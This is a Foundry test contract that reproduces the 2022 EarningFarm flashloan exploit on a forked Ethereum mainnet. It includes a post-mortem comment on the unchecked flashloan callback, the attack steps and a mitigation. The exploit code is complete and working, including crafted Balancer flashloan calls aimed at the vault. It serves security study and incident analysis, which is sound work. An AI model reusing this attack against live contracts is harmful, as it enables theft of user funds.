// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from '../../interfaces/IWETH9.sol';
import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";

// forge test --match-contract Exploit_EarningFarm -vvv
/*
On Oct 14, 2022 an attacker stole 200 ETH from EarningFarm.


// Attack Overview
Total Lost: ~750ETH (550 ETH were returned by a MEV frontrunning bot, 200 ETH were stolen)
Attack Tx: https://etherscan.io/tx/0x160c5950a01b88953648ba90ec0a29b0c5383e055d35a7835d905c53a3dda01e
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0x160c5950a01b88953648ba90ec0a29b0c5383e055d35a7835d905c53a3dda01e

Exploited Contract: https://etherscan.io/address/0xe39fd820b58f83205db1d9225f28105971c3d309
Attacker Address: 0xdf31f4c8dc9548eb4c416af26dc396a25fde4d5f
Attacker Contract: https://etherscan.io/address/0x983dfBa1c0724786598Af0E63a9a6f94aAbd24A1
Attack Block: 15746342 

// Key Info Sources
Twitter: https://twitter.com/Supremacy_CA/status/1581012823701786624
Code: https://etherscan.io/address/0xe39fd820b58f83205db1d9225f28105971c3d309#code


Principle: Unchecked Flashloan reception

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) public payable {
        require(msg.sender == balancer, "only flashloan vault"); --------- CHECKS ONLY THE ORIGIN OF THE LOAN
        // ------------------------------------------------------ SHOULD CHECK ALSO THAT WAS REQUESTED BY EF!
        uint256 loan_amount = amounts[0];
        uint256 fee_amount = feeAmounts[0];

        if (keccak256(userData) == keccak256("0x1")){
          _deposit(loan_amount, fee_amount);
        }
        if (keccak256(userData) == keccak256("0x2")){
          _withdraw(loan_amount, fee_amount);
        }
    }

    function _withdraw(uint256 amount, uint256 fee_amount) internal {
        uint256 steth_amount = amount.safeMul(IERC20(asteth).balanceOf(address(this))).safeDiv(getDebt());
        if (IERC20(weth).allowance(address(this), aave) != 0) {IERC20(weth).safeApprove(aave, 0);}
        IERC20(weth).safeApprove(aave, amount);

        IAAVE(aave).repay(weth, amount, 2, address(this));
        IAAVE(aave).withdraw(lido, steth_amount, address(this));

        if (IERC20(lido).allowance(address(this), curve_pool) != 0) {IERC20(lido).safeApprove(curve_pool, 0);}
        IERC20(lido).safeApprove(curve_pool, steth_amount);
        ICurve(curve_pool).exchange(1, 0, steth_amount, 0);

        (bool status, ) = weth.call.value(amount.safeAdd(fee_amount))("");
        require(status, "transfer eth failed");
        IERC20(weth).safeTransfer(balancer, amount.safeAdd(fee_amount));
    }

VULNERABILITY
1) The receiveFlashloan function does not checks if the loan was requested by the contract. It is worth noting that Balancer
flashloan function does not include the initiator in the function signature.
2) The contract does not properly check that the initial balance of the contract is not reduced after the loan.

ATTACK:
1) Desposit a tiny amount
2) Request a flashloan from balancer to EFVault
3) Withdraw the amount backed by the leftover

MITIGATIONS:
1) Implement flashloans that are EIP-3156 compliant in terms of passing the msg.sender as a parameter of the flashloan callback.

*/
interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;    
}

interface IEFVault {
    function withdraw(uint256 _amount) external;    
    function deposit(uint256) payable external;
}

contract Exploit_EarningFarm is TestHarness, TokenBalanceTracker, BalancerFlashloan {
    IDVM internal dvm = IDVM(0x983dfBa1c0724786598Af0E63a9a6f94aAbd24A1);
    IEFVault internal efvault = IEFVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    
    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 internal eftoken = IERC20(0xBAe7EC1BAaAe7d5801ad41691A2175Aa11bcba19);

    function setUp() external {
        cheat.createSelectFork('mainnet', 15746199);
        cheat.deal(address(this), 0.1 ether);

        addTokenToTracker(address(weth));
        addTokenToTracker(address(eftoken));

        updateBalanceTracker(address(this));
    }

    function test_attack() external {
        console.log('===== STEP 1: Request Flashloan =====');
        dvm.flashLoan(100000000000000000, 0, address(this), hex'31');
    }


    function DVMFlashLoanCall(address arg0, uint256 arg1, uint256 arg2, bytes memory) external {
        require(msg.sender == address(dvm), 'Only DVM');
        require(arg0 == address(this), 'Only requested by this');

        uint256 wethAmt = weth.balanceOf(address(this));
        uint256 ethBefore = address(this).balance;

        console.log('===== STEP 2: Loan Received =====');
        logBalancesWithLabel('Attacker Contract', address(this));

        console.log('===== STEP 3: Deposit to Vault =====');
        efvault.deposit{value: ethBefore}(wethAmt); // https://etherscan.io/tx/0xa59c6b0f288dcc2ba897436620af404f1443635862e555f8ece8e31f3541c5e4
        uint256 initialEfBalance = eftoken.balanceOf(address(this));
        
        logBalancesWithLabel('Attacker Contract', address(this));
        
        console.log('===== STEP 4: Request Balancer loan to the EFVault =====');
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amts = new uint256[](1);
        _amts[0] = 560000000000000000000;

        balancer.flashLoan(address(efvault), _tokens, _amts, hex'307832');
        logBalancesWithLabel('EF Vault', address(efvault));

        console.log('===== STEP 5: Withdraw from vault =====');
        efvault.withdraw(initialEfBalance);

        console.log('===== STEP 6: Repay Loan =====');
        uint256 profit = address(this).balance - ethBefore;
        
        weth.transfer(address(dvm), 100000000000000000);
        logBalancesWithLabel('Attacker Contract', address(this));
    } 

    receive() external payable {}


}